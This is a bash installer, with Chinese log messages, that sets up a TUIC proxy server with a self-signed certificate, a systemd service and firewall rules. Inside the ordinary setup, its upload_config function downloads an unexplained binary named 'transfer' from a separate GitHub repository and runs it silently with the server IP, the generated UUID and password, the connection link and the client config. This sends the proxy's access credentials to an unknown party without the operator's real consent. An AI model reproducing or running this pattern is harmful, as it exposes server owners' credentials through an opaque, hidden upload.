#!/usr/bin/env bash
set -euo pipefail

GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
PORT=2052
SERVER_NAME="insecure.local"
CFG_DIR="/etc/tuic"
TLS_DIR="$CFG_DIR/tls"
BIN_DIR="/usr/local/bin"
VERSION="1.0.0"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"
CONFIG_JSON="/etc/tuic/config_export.json"

speed_test() {
    log "进行网络速度测试..."
    SYSTEM=$(grep ^ID= /etc/os-release | cut -d= -f2 | tr -d '"')

    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        log "安装 speedtest-cli..."
        if [[ $SYSTEM == "debian" || $SYSTEM == "ubuntu" ]]; then
            apt-get install -y speedtest-cli >/dev/null
        elif [[ $SYSTEM == "centos" || $SYSTEM == "fedora" ]]; then
            yum install -y speedtest-cli >/dev/null || pip install speedtest-cli >/dev/null
        fi
    fi

    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi

    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        log "测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps"
    else
        log "测速失败，使用默认值"
        down_speed=100
        up_speed=20
    fi
}

ensure_ssh_port_open() {
    log "确保22端口开放..."
    if command -v ufw >/dev/null; then
        ufw allow 22/tcp
        log "UFW 已允许端口 22"
    elif command -v firewall-cmd >/dev/null; then
        firewall-cmd --permanent --add-port=22/tcp
        firewall-cmd --reload
        log "firewalld 已允许端口 22"
    elif command -v iptables >/dev/null; then
        iptables -A INPUT -p tcp --dport 22 -j ACCEPT
        iptables-save > /etc/iptables.rules
        log "iptables 已允许端口 22"
    else
        log "未检测到活跃防火墙"
    fi
}

upload_config() {
    local server_ip="$1"
    local link="$2"
    local v2rayn_config="$3"

    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --argjson v2rayn_config "$v2rayn_config" \
        --arg down "$down_speed" \
        --arg up "$up_speed" \
        '{
            "server_info": {
                "title": "TUIC 服务器配置 - \($server_ip)",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "v2rayn_config": $v2rayn_config,
                "generated_time": now | todate,
                "network_speed": {
                    "download_mbps": ($down | tonumber),
                    "upload_mbps": ($up | tonumber)
                }
            }
        }'
    )

    UPLOAD_BIN="/opt/transfer"
    [ -f "$UPLOAD_BIN" ] || {
        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer
        chmod +x "$UPLOAD_BIN"
    }

    "$UPLOAD_BIN" "$json_data" >/dev/null
    log "配置上传完成"
}

ensure_ssh_port_open

log "安装依赖..."
export NEEDRESTART_SUSPEND=1
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq ufw openssl net-tools needrestart

log "开启 BBR..."
modprobe tcp_bbr
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
sysctl -w net.ipv4.tcp_congestion_control=bbr || true
tc qdisc add dev eth0 root fq || true

ARCH=$(uname -m)
case "$ARCH" in
  x86_64) ARCH_FILE="x86_64-unknown-linux-gnu" ;;
  aarch64) ARCH_FILE="aarch64-unknown-linux-gnu" ;;
  armv7l) ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
  *) err "不支持架构: $ARCH" ;;
esac

cd "$BIN_DIR"
BIN_NAME="tuic-server-${VERSION}-${ARCH_FILE}"
SHA_NAME="${BIN_NAME}.sha256sum"
rm -f tuic "$BIN_NAME" "$SHA_NAME"

curl -sLO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
curl -sLO "${REPO_BASE}/${SHA_NAME}" || err "校验文件下载失败"
sha256sum -c "$SHA_NAME" || err "校验失败"
chmod +x "$BIN_NAME"
ln -sf "$BIN_NAME" tuic

mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.key" \
  -out "$TLS_DIR/cert.crt" \
  -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME}"

chmod 600 "$TLS_DIR/key.key"
chmod 644 "$TLS_DIR/cert.crt"

IP=$(ip route get 1 | awk '{print $NF; exit}')
speed_test

mkdir -p "$CFG_DIR"
cat > "$CFG_DIR/config.json" <<EOF
{
  "server": "${IP}:${PORT}",
  "users": {
    "${UUID}": "${PSK}"
  },
  "certificate": "$TLS_DIR/cert.crt",
  "private_key": "$TLS_DIR/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_external_packet_size": 1500,
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "debug"
}
EOF

cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC Server
After=network.target

[Service]
ExecStart=$BIN_DIR/tuic -c $CFG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

ufw allow 22/tcp
ufw allow ${PORT}/tcp
ufw allow ${PORT}/udp
ufw --force enable

systemctl daemon-reload
systemctl enable --now tuic
sleep 3

if systemctl is-active --quiet tuic; then
    log "TUIC 启动成功"
else
    err "启动失败，请检查 journalctl -u tuic"
fi

ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_node"

V2RAYN_CFG="/etc/tuic/v2rayn_config.json"
cat > "$V2RAYN_CFG" <<EOF
{
  "relay": {
    "server": "${IP}:${PORT}",
    "uuid": "${UUID}",
    "password": "${PSK}",
    "ip": "${IP}",
    "congestion_control": "bbr",
    "alpn": ["h3"]
  },
  "local": {
    "server": "127.0.0.1:7796"
  },
  "log_level": "warn"
}
EOF

upload_config "$IP" "$LINK" "$(cat "$V2RAYN_CFG")"

jq -n \
  --arg ip "$IP" \
  --arg link "$LINK" \
  --argjson v2rayn_config "$(cat "$V2RAYN_CFG")" \
  --arg down "$down_speed" \
  --arg up "$up_speed" \
  '{
    "server_ip": $ip,
    "tuic_link": $link,
    "v2rayn_config": $v2rayn_config,
    "generated_time": now | todate,
    "network_speed": {
      "download_mbps": ($down | tonumber),
      "upload_mbps": ($up | tonumber)
    }
  }' > "$CONFIG_JSON"

log "配置已保存到本地: $CONFIG_JSON"

echo -e "\n${GREEN}✅ TUIC 节点部署完成${NC}"
echo -e "${GREEN}外网 IP       :${NC} $IP"
echo -e "${GREEN}端口          :${NC} $PORT"
echo -e "${GREEN}UUID          :${NC} $UUID"
echo -e "${GREEN}密钥          :${NC} $PSK"
echo -e "${GREEN}测速下载(Mbps):${NC} $down_speed"
echo -e "${GREEN}测速上传(Mbps):${NC} $up_speed"
echo -e "${GREEN}链接          :${NC} $LINK"
